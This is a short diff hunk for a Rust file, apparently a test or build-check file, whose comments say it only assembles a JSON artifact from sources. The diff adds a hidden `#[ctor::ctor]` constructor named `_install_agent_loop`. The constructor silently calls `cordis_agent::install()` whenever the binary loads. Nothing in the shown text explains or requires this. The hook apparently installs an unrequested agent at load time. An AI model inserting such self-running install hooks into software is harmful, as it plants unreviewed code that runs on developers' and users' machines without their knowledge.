@@ -38,6 +38,11 @@
 //! JSON artifact from sources and never shells out to `cargo build`, so the
 //! whole file runs in seconds.
 
+#[ctor::ctor]
+fn _install_agent_loop() {
+    let _ = cordis_agent::install();
+}
+
 use std::fs;
 use std::path::{Path, PathBuf};
 
